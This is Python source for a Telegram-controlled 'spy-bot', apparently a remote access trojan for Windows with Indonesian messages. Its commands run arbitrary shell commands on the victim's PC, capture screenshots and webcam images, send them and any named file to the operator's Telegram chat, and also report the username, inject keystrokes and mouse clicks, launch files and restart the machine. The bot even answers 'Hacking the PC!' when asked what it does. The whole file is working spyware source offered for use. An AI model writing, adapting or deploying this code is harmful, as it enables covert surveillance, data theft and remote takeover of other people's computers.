# Modules.
from telebot import * # Telegram module.
from json import load # Parse Json.
from messages.welcome import welcome as welcome_message # Welcome message.
from messages.help import _help as help_message # Help message.
from messages.about import about as about_message # About message.
from messages.credits import _credits as credits_message # Credits message.
from messages.commands import commands as commands_message # Commands message.
from assets import \
	_screenshot_win32, alert, speak, \
		ctime, system, press, \
			typewrite, startfile, cv2, \
				click, position, user \
					# Assets.



# Parse config.
def config(key):
	with open('config.json', 'r') as _config: return load(_config)[key]

# Spy-bot client.
spybot = TeleBot(config('Token'))

# Commands.
commands = {
	'start': 'start',
	'help': 'help',
	'about': 'about',
	'credits': 'credits',
	'screenshot': 'screenshot',
	'message': 'message',
	'say': 'say',
	'cmd': 'cmd',
	'press': 'press',
	'typewrite': 'typewrite',
	'click': 'click',
	'mousepos': 'mousepos',
	'startfile': 'startfile',
	'webcam': 'webcam',
	'getfile': 'getfile',
	'pc-username': 'username',
	'shutdown': 'shutdown',
	'commands': 'commands',
	'clear': 'clear'
}

start = commands['start']
_help = commands['help']
about = commands['about']
_credits = commands['credits']
screenshot = commands['screenshot']
message = commands['message']
say = commands['say']
cmd = commands['cmd']
_press = commands['press']
_typewrite = commands['typewrite']
_click = commands['click']
_startfile = commands['startfile']
webcam = commands['webcam']
clear = commands['clear']
getfile = commands['getfile']
mousepos = commands['mousepos']
pc_username = commands['pc-username']
shutdown = commands['shutdown']
_commands = commands['commands']

# Arguments missed.
some_arguments_missed = 'Beberapa argumen tidak ditentukan... 😐'

# Start bot.
@spybot.message_handler(commands = [start])
def start_func(message): spybot.send_message(message.chat.id, welcome_message)

# Help.
@spybot.message_handler(commands = [_help])
def help_func(message): spybot.send_message(message.chat.id, help_message)

# About.
@spybot.message_handler(commands = [about])
def about_func(message): spybot.send_message(message.chat.id, about_message)

# Credits.
@spybot.message_handler(commands = [_credits])
def credits_func(message): spybot.send_message(message.chat.id, credits_message)

# Screenshot.
@spybot.message_handler(commands = [screenshot])
def screenshot_func(message):
	try:
		_screenshot_win32('screenshots\\screenshot.png')
	except FileExistsError:
		from os import remove

		remove('screenshots\\screenshot.png')
		_screenshot_win32('screenshots\\screenshot.png')

	spybot.send_photo(message.chat.id, open('screenshots\\screenshot.png', 'rb'), ctime())

# Message.
@spybot.message_handler(commands = [message])
def message_func(message):
	try:
		spybot.send_message(message.chat.id, f'Judul: {message.text.split()[1]}\nТекст: {message.text.split()[2]}\nTeks: {message.text.split()[3]}')
		alert(message.text.split()[2], message.text.split()[1], message.text.split()[3])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Tooltip:\n/message [Judul: String][Text: String][Button: String].')

# Say.
@spybot.message_handler(commands = [say])
def say_func(message):
	try:
		spybot.send_message(message.chat.id, f'Teks: {message.text.split()[1]}')
		speak(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Tooltip:\n/say [Text: string].')

# Command to cmd.
@spybot.message_handler(commands = [cmd])
def cmd_func(message):
	try:
		command = message.text.replace(' ', '_').split('!')
		spybot.send_message(message.chat.id, 'perintah: {}'.format(command[1].replace('_', ' ')))
		system(command[1].replace('_', ' '))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Petunjuk:\n/cmd [!] [Command: string].\n! Pemisah.')

# Press key
@spybot.message_handler(commands = [_press])
def press_func(message):
	try:
		spybot.send_message(message.chat.id, f'kunci: {message.text.split()[1]}')
		press(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Tooltip:\n/tekan [Tombol: string].')

# Write word.
@spybot.message_handler(commands = [_typewrite])
def typewrite_func(message):
	try:
		spybot.send_message(message.chat.id, f'Teks: {message.text.split()[1]}\nInterval: {message.text.split()[2]}')
		typewrite(message.text.split()[1], float(message.text.split()[2]))
	except (IndexError, ValueError) as error:
		if 'list' in str(error):
			spybot.send_message(message.chat.id, some_arguments_missed)
			spybot.send_message(message.chat.id, 'Tooltip:\n/typewrite [Teks: string][Penspasian: angka].')

		elif 'float' in str(error):
			spybot.send_message(message.chat.id, 'Interval harus angka!')

# Click.
@spybot.message_handler(commands = [_click])
def click_func(message):
	try:
		spybot.send_message(message.chat.id, f'X: {message.text.split()[1]}\nY: {message.text.split()[2]}\nClicks: {message.text.split()[3]}')
		click(int(message.text.split()[1]), int(message.text.split()[2]), int(message.text.split()[3]))
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Petunjuk:\n/klik [X: number][Y: number][Klik: number].')

# Mouse position.
@spybot.message_handler(commands = [mousepos])
def mousepos_func(message): spybot.send_message(message.chat.id, f'X: {list(position())[0]}\nY: {list(position())[1]}')

# Startfile.
@spybot.message_handler(commands = [_startfile])
def startfile_func(message):
	try:
		spybot.send_message(message.chat.id, f'arsip: {message.text.split()[1]}')
		startfile(message.text.split()[1])
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Tooltip:\n/startfile [File: string (jalur)].')

# Webcam screenshot.
@spybot.message_handler(commands = [webcam])
def webcam_func(message):
	frames = 10 * 3
	cap = cv2.VideoCapture(0)
	for _ in range(frames): cap.read()
	ret, frame = cap.read()
	try:
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)
	except FileExistsError:
		from os import remove

		remove('webcam-screenshots\\webcam-screenshot.png')
		cv2.imwrite('webcam-screenshots\\webcam-screenshot.png', frame)

	finally:
		cap.release()
		spybot.send_photo(message.chat.id, open('webcam-screenshots\\webcam-screenshot.png', 'rb'), ctime())

# Get file from PC.
@spybot.message_handler(commands = [getfile])
def getfile_func(message):
	try:
		spybot.send_document(message.chat.id, open(message.text.split()[1], 'rb'))
	except FileNotFoundError: spybot.send_message(message.chat.id, 'Berkas tak ditemukan.... 😥')
	except PermissionError: spybot.send_message(message.chat.id, 'Windows tidak memberi kami hak untuk memberi kami file ini... 😥')
	except IndexError:
		spybot.send_message(message.chat.id, some_arguments_missed)
		spybot.send_message(message.chat.id, 'Tooltip:\n/getfile [File: String].')

# Get username.
@spybot.message_handler(commands = [pc_username])
def pc_username_func(message): spybot.send_message(message.chat.id, f'Nama pengguna: {user()}')

# Shutdown.
@spybot.message_handler(commands = [shutdown])
def shutdown_func(message):
	spybot.send_message(message.chat.id, 'Matikan PC-nya....')
	system('shutdown /r')

# Commands.
@spybot.message_handler(commands = [_commands])
def commands_func(message): spybot.send_message(message.chat.id, commands_message)

# Clear folders.
@spybot.message_handler(commands = [clear])
def clear_func(message):
	from os import remove
	try:
		remove('screenshots\\screenshot.png')
		remove('webcam-screenshots\\webcam-screenshot.png')
	except FileNotFoundError: spybot.send_message(message.chat.id, 'Beberapa berkas tidak diinisialisasi.')
	finally:
		del remove
		spybot.send_message(message.chat.id, 'Folder dikosongkan.')

# Speak.
@spybot.message_handler(content_types = ['text'])
def chatbot(message):
	if 'Halo' in message.text.lower(): spybot.send_message(message.chat.id, 'Halo!')
	elif 'Panjang sekali' in message.text.lower(): spybot.send_message(message.chat.id, 'Panjang sekali!')
	elif 'Bagaimana keadaannya' in message.text.lower(): spybot.send_message(message.chat.id, 'Oke!')
	elif 'apa yang Anda lakukan' in message.text.lower(): spybot.send_message(message.chat.id, 'Meretas PC!')
	elif 'ок' in message.text.lower(): spybot.send_message(message.chat.id, 'Ок!')
	else: spybot.send_message(message.chat.id, 'Saya tidak mengerti.')

# Run.
spybot.polling(True)
